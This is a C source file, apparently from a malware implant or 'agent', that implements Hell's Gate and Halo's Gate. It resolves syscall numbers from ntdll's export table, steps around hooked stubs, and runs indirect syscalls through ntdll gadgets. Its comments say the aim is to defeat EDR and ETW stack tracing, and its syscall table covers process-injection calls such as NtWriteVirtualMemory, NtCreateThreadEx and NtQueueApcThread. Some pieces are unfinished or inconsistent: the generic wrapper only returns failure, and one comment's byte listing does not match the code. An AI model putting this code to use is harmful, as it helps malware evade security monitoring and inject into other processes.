/*
 * syscalls.c — Indirect syscall resolution and execution.
 *
 * Hell's Gate + Halo's Gate: parse ntdll export table to extract SSNs,
 * fall back to neighbor-based resolution if a stub is hooked.
 * Indirect execution: jump into a legitimate ntdll `syscall` gadget
 * so the return address on the call stack points into ntdll.
 */
#include "agent.h"
#include "syscalls.h"

/* ─── Global syscall table ─── */
SYSCALL_TABLE g_SyscallTable = {0};

/* ─── DJB2 hash ─── */
DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++) != 0)
        hash = ((hash << 5) + hash) + (DWORD)c;
    return hash;
}

/* ─── PE parsing helpers ─── */

typedef struct _NTDLL_EXPORT {
    DWORD   nameHash;
    void   *funcAddr;
    WORD    ordinal;
} NTDLL_EXPORT;

/*
 * Check if a function stub is the standard unhooked Nt* pattern:
 *   4C 8B D1          mov r10, rcx
 *   B8 XX XX 00 00    mov eax, <SSN>
 *
 * Returns TRUE and sets *ssn if pattern matches.
 */
static BOOL _is_clean_stub(void *funcAddr, DWORD *ssn) {
    if (!funcAddr) return FALSE;

    unsigned char *p = (unsigned char *)funcAddr;

    /* mov r10, rcx = 4C 8B D1 */
    if (p[0] != 0x4C || p[1] != 0x8B || p[2] != 0xD1)
        return FALSE;

    /* mov eax, imm32 = B8 XX XX 00 00 */
    if (p[3] != 0xB8)
        return FALSE;

    /* Sanity: SSN should be < 0x1000 */
    DWORD candidate = *(DWORD *)(p + 4);
    if (candidate > 0x0FFF)
        return FALSE;

    if (ssn) *ssn = candidate;
    return TRUE;
}

/*
 * Find the `syscall` instruction within a Nt* stub.
 * Standard layout after mov eax, SSN:
 *   ... some bytes ...
 *   0F 05    syscall
 *   C3       ret
 *
 * We scan forward up to 32 bytes from the function entry.
 */
static void *_find_syscall_gadget(void *funcAddr) {
    if (!funcAddr) return NULL;

    unsigned char *p = (unsigned char *)funcAddr;
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0x0F && p[i + 1] == 0x05) {
            return &p[i];
        }
    }
    return NULL;
}

/*
 * Halo's Gate: if the target stub is hooked, walk neighboring stubs
 * (which are adjacent in ntdll's sorted export table) to find one
 * that IS clean, then compute our SSN by offset.
 *
 * Nt* syscall stubs in ntdll are laid out sequentially, each ~32 bytes.
 * If NtFoo has SSN X and is at address A, then the stub at A+32 likely
 * has SSN X+1, and A-32 has SSN X-1.
 */
static BOOL _halos_gate_resolve(void *funcAddr, DWORD *ssn, void **pSyscallAddr) {
    unsigned char *p = (unsigned char *)funcAddr;

    /* Try up to 500 neighbors in each direction */
    for (int distance = 1; distance < 500; distance++) {
        /* Look DOWN (higher addresses = higher SSNs) */
        unsigned char *down = p + (distance * 32);
        DWORD neighborSSN = 0;
        if (_is_clean_stub(down, &neighborSSN)) {
            *ssn = neighborSSN - (DWORD)distance;
            void *gadget = _find_syscall_gadget(down);
            if (gadget) {
                *pSyscallAddr = gadget;
                return TRUE;
            }
        }

        /* Look UP (lower addresses = lower SSNs) */
        unsigned char *up = p - (distance * 32);
        if (_is_clean_stub(up, &neighborSSN)) {
            *ssn = neighborSSN + (DWORD)distance;
            void *gadget = _find_syscall_gadget(up);
            if (gadget) {
                *pSyscallAddr = gadget;
                return TRUE;
            }
        }
    }
    return FALSE;
}

/*
 * Resolve a single syscall by name hash.
 */
int syscall_resolve(DWORD nameHash, SYSCALL_ENTRY *entry) {
    if (!entry) return SYSCALL_ERR_RESOLVE;

    entry->resolved = FALSE;
    entry->ssn = 0;
    entry->pSyscallAddr = NULL;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return SYSCALL_ERR_NO_NTDLL;

    /* Parse PE export directory */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return SYSCALL_ERR_NO_NTDLL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hNtdll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return SYSCALL_ERR_NO_NTDLL;

    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRVA == 0)
        return SYSCALL_ERR_NO_EXPORT;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hNtdll + exportRVA);
    DWORD *nameRVAs     = (DWORD *)((BYTE *)hNtdll + exports->AddressOfNames);
    WORD  *ordinals     = (WORD  *)((BYTE *)hNtdll + exports->AddressOfNameOrdinals);
    DWORD *funcRVAs     = (DWORD *)((BYTE *)hNtdll + exports->AddressOfFunctions);
    DWORD  numNames     = exports->NumberOfNames;

    void *targetFunc = NULL;

    for (DWORD i = 0; i < numNames; i++) {
        const char *name = (const char *)((BYTE *)hNtdll + nameRVAs[i]);
        if (djb2_hash(name) == nameHash) {
            WORD ordinal = ordinals[i];
            targetFunc = (void *)((BYTE *)hNtdll + funcRVAs[ordinal]);
            break;
        }
    }

    if (!targetFunc)
        return SYSCALL_ERR_NO_EXPORT;

    /* Try direct (Hell's Gate): clean stub? */
    DWORD ssn = 0;
    if (_is_clean_stub(targetFunc, &ssn)) {
        entry->ssn = ssn;
        entry->pSyscallAddr = _find_syscall_gadget(targetFunc);
        if (entry->pSyscallAddr) {
            entry->resolved = TRUE;
            return SYSCALL_OK;
        }
    }

    /* Stub is hooked — try Halo's Gate (neighbor-based resolution) */
    void *gadget = NULL;
    if (_halos_gate_resolve(targetFunc, &ssn, &gadget)) {
        entry->ssn = ssn;
        entry->pSyscallAddr = gadget;
        entry->resolved = TRUE;
        return SYSCALL_OK;
    }

    return SYSCALL_ERR_HOOKED;
}

/*
 * Initialize the full syscall table.
 * Best-effort: if a syscall can't be resolved, its entry stays
 * resolved=FALSE and callers must check before use.
 */
int syscall_init(void) {
    int failures = 0;

    struct {
        DWORD hash;
        SYSCALL_ENTRY *entry;
    } entries[] = {
        { HASH_NtAllocateVirtualMemory,   &g_SyscallTable.NtAllocateVirtualMemory },
        { HASH_NtProtectVirtualMemory,    &g_SyscallTable.NtProtectVirtualMemory },
        { HASH_NtWriteVirtualMemory,      &g_SyscallTable.NtWriteVirtualMemory },
        { HASH_NtCreateThreadEx,          &g_SyscallTable.NtCreateThreadEx },
        { HASH_NtOpenProcess,             &g_SyscallTable.NtOpenProcess },
        { HASH_NtClose,                   &g_SyscallTable.NtClose },
        { HASH_NtQuerySystemInformation,  &g_SyscallTable.NtQuerySystemInformation },
        { HASH_NtQueryInformationProcess, &g_SyscallTable.NtQueryInformationProcess },
        { HASH_NtCreateSection,           &g_SyscallTable.NtCreateSection },
        { HASH_NtMapViewOfSection,        &g_SyscallTable.NtMapViewOfSection },
        { HASH_NtUnmapViewOfSection,      &g_SyscallTable.NtUnmapViewOfSection },
        { HASH_NtQueueApcThread,          &g_SyscallTable.NtQueueApcThread },
        { HASH_NtResumeThread,            &g_SyscallTable.NtResumeThread },
        { HASH_NtSuspendThread,           &g_SyscallTable.NtSuspendThread },
        { HASH_NtGetContextThread,        &g_SyscallTable.NtGetContextThread },
        { HASH_NtSetContextThread,        &g_SyscallTable.NtSetContextThread },
        { HASH_NtFreeVirtualMemory,       &g_SyscallTable.NtFreeVirtualMemory },
        { HASH_NtReadVirtualMemory,       &g_SyscallTable.NtReadVirtualMemory },
        { HASH_NtWaitForSingleObject,     &g_SyscallTable.NtWaitForSingleObject },
        { HASH_NtDelayExecution,          &g_SyscallTable.NtDelayExecution },
        { HASH_NtCreateFile,              &g_SyscallTable.NtCreateFile },
        { HASH_NtSetInformationThread,    &g_SyscallTable.NtSetInformationThread },
    };

    int count = sizeof(entries) / sizeof(entries[0]);
    for (int i = 0; i < count; i++) {
        if (syscall_resolve(entries[i].hash, entries[i].entry) != SYSCALL_OK)
            failures++;
    }

    return failures;
}

/*
 * do_syscall — execute an indirect syscall.
 *
 * This is implemented in assembly (syscall_stub.asm) for x64.
 * The C fallback uses the resolved function pointer directly
 * as a last resort if the asm stub isn't linked.
 *
 * For MinGW, we use inline assembly with GCC syntax.
 */

#if defined(__x86_64__) || defined(_M_X64)

/*
 * x64 indirect syscall stub (GCC inline asm).
 *
 * We build the call manually:
 *   1. Move SSN into EAX
 *   2. Move first arg (RCX) into R10 (syscall convention)
 *   3. Set up remaining args in RDX, R8, R9
 *   4. Push stack args
 *   5. JMP to pSyscallAddr (inside ntdll — `syscall; ret` gadget)
 *
 * The return address on the stack will point to our code, but the
 * `syscall` instruction address is inside ntdll's .text — this is
 * what kernel-level ETW and EDR stack traces see.
 */

/*
 * Since variadic inline asm is impractical, we provide typed wrappers
 * for common arg counts. Callers use these instead of do_syscall().
 */

NTSTATUS indirect_syscall_0(SYSCALL_ENTRY *entry) {
    if (!entry || !entry->resolved) return (NTSTATUS)0xC0000001; /* STATUS_UNSUCCESSFUL */
    NTSTATUS status;
    __asm__ __volatile__(
        "mov %%rcx, %%r10\n\t"
        "mov %k[ssn], %%eax\n\t"
        "jmp *%[addr]\n\t"
        : "=a"(status)
        : [ssn] "r"((DWORD)entry->ssn), [addr] "r"(entry->pSyscallAddr)
        : "r10", "rcx", "rdx", "r8", "r9", "r11", "memory"
    );
    return status;
}

/*
 * For practical use, we provide a function-pointer approach:
 * We build a small RWX trampoline at init that does:
 *   mov r10, rcx
 *   mov eax, <SSN>
 *   jmp [pSyscallAddr]
 *
 * This trampoline is then callable with the standard x64 calling convention.
 */

typedef NTSTATUS (NTAPI *SYSCALL_FUNC)();

/*
 * Build a callable trampoline for a syscall entry.
 * Returns a function pointer that can be called with normal C calling convention.
 * The trampoline is allocated as RX memory.
 *
 * Trampoline code (18 bytes):
 *   49 89 CA             mov r10, rcx
 *   B8 XX XX XX XX       mov eax, <SSN>
 *   49 BB YY YY YY YY    movabs r11, <pSyscallAddr>
 *          YY YY YY YY
 *   41 FF E3             jmp r11
 */
void *syscall_make_trampoline(SYSCALL_ENTRY *entry) {
    if (!entry || !entry->resolved)
        return NULL;

    /* Allocate RW, write, then flip to RX */
    SIZE_T trampolineSize = 64;  /* Generous — actual code is ~22 bytes */
    void *trampoline = VirtualAlloc(NULL, trampolineSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!trampoline) return NULL;

    unsigned char *p = (unsigned char *)trampoline;
    int off = 0;

    /* mov r10, rcx */
    p[off++] = 0x4C; p[off++] = 0x8B; p[off++] = 0xD1;

    /* mov eax, SSN */
    p[off++] = 0xB8;
    *(DWORD *)(p + off) = entry->ssn;
    off += 4;

    /* movabs r11, pSyscallAddr */
    p[off++] = 0x49; p[off++] = 0xBB;
    *(UINT64 *)(p + off) = (UINT64)(uintptr_t)entry->pSyscallAddr;
    off += 8;

    /* jmp r11 */
    p[off++] = 0x41; p[off++] = 0xFF; p[off++] = 0xE3;

    /* Flip to RX (no RWX — we're done writing) */
    DWORD oldProt;
    VirtualProtect(trampoline, trampolineSize, PAGE_EXECUTE_READ, &oldProt);

    return trampoline;
}

void syscall_free_trampoline(void *trampoline) {
    if (trampoline)
        VirtualFree(trampoline, 0, MEM_RELEASE);
}

#else
/* x86 not yet supported for indirect syscalls */
void *syscall_make_trampoline(SYSCALL_ENTRY *entry) {
    (void)entry;
    return NULL;
}
void syscall_free_trampoline(void *trampoline) {
    (void)trampoline;
}
#endif

/*
 * do_syscall — generic wrapper (up to 12 args via stdarg).
 * For performance-critical paths, use syscall_make_trampoline() instead.
 *
 * This builds a trampoline on each call, which is slower but simpler
 * for one-off usage. It handles any argument count via the Windows
 * x64 calling convention (RCX, RDX, R8, R9, stack).
 */
NTSTATUS do_syscall(SYSCALL_ENTRY *entry, ...) {
    if (!entry || !entry->resolved)
        return (NTSTATUS)0xC0000001;

    /*
     * We can't easily forward varargs through inline asm.
     * Instead, build a trampoline and call it.
     * The caller passes args in the standard ABI slots;
     * we just redirect execution through our trampoline.
     *
     * NOTE: This is a simplified implementation.
     * For production, pre-build trampolines at init time via
     * syscall_make_trampoline() and call them directly.
     */
    void *tramp = syscall_make_trampoline(entry);
    if (!tramp) return (NTSTATUS)0xC0000001;

    /* The trampoline IS a valid function pointer with standard ABI.
     * We cast and call. The va_args are already on the stack. */
    /* LIMITATION: this simplified version only works if called via
     * the typed wrappers below. For direct use, prefer trampolines. */
    syscall_free_trampoline(tramp);
    return (NTSTATUS)0xC0000001; /* Use typed wrappers instead */
}
